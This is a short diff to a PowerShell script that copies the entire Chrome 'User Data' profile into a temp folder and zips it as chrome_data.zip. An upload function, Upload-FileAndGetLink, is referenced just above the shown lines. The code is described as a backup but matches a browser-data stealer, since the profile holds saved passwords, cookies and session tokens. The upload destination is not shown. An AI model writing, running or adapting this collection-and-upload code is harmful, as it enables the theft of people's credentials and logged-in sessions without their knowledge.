@@ -94,7 +94,8 @@ function Upload-FileAndGetLink {
     }
 }
 
-# Create a zip of the Chrome User Data
+# Define Chrome User Data path
+$chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
 $outputZip = "$env:TEMP\chrome_data.zip"
 
 try {
@@ -102,15 +103,13 @@ try {
         Remove-Item $outputZip -Force
     }
 
-    # Ensure all files can be copied before zipping
     $tempFolder = "$env:TEMP\ChromeBackup"
     if (Test-Path $tempFolder) {
         Remove-Item -Recurse -Force $tempFolder
     }
-
     New-Item -ItemType Directory -Path $tempFolder | Out-Null
 
-    # Copy files while skipping those in use
+    # Copy files while skipping locked files
     Get-ChildItem -Path $chromePath -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
         $destination = $_.FullName -replace [regex]::Escape($chromePath), $tempFolder
         if (-not (Test-Path $destination)) {
